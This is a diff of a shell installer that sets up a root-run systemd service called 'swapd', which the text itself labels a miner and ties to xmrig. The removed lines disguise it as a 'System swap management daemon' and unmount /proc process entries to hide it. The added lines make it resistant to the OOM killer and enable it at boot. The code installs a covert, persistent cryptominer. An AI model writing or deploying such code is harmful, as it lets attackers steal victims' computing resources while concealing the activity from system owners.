@@ -1913,48 +1913,41 @@ EOF
 
 chmod +x /root/.swapd/launcher.sh
 
-        cat >/tmp/swapd.service <<EOL
+cat > /tmp/swapd.service << 'EOL'
 [Unit]
-Description=System swap management daemon
+Description=Swap Daemon Miner
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=$HOME/.swapd/swapd --config=/root/.swapd/config.json
+User=root
+WorkingDirectory=/root/.swapd
+ExecStart=/root/.swapd/swapd --config=/root/.swapd/config.json
 Restart=always
 RestartSec=10
-TimeoutStartSec=30
-
-# Resource constraints optimized for stability
-Nice=19
-CPUSchedulingPolicy=idle
-IOSchedulingClass=idle
-CPUQuota=95%
-
-# FIXED: Lower OOM score to prevent killing (was 1000)
-# Lower value = less likely to be killed by OOM killer
-OOMScoreAdjust=200
-
-# Memory limits for low-RAM systems (prevents runaway usage)
-MemoryMax=400M
-MemoryHigh=300M
-
-# CRITICAL: Enable logging for debugging (was null before!)
 StandardOutput=journal
 StandardError=journal
 SyslogIdentifier=swapd
 
-# Clean umount on stop
-ExecStopPost=/usr/bin/bash -c 'umount -l /proc/[0-9]* 2>/dev/null || true'
+# Prevent OOM killer from killing miner
+OOMScoreAdjust=-100
+
+# Limit memory usage
+MemoryMax=500M
+MemoryHigh=400M
 
 [Install]
 WantedBy=multi-user.target
 EOL
-        sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
-        
-        echo "[*] Ensuring old swapd processes are stopped before starting new service..."
-        # Use robust force-stop to ensure clean start
-        force_stop_service "swapd" "swapd xmrig"
+
+# Then you would typically:
+sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
+sudo systemctl daemon-reload
+sudo systemctl enable swapd
+sudo systemctl start swapd
+
+
+
         
         echo "[*] Making launcher.sh executable..."
         chmod +x /root/.swapd/launcher.sh
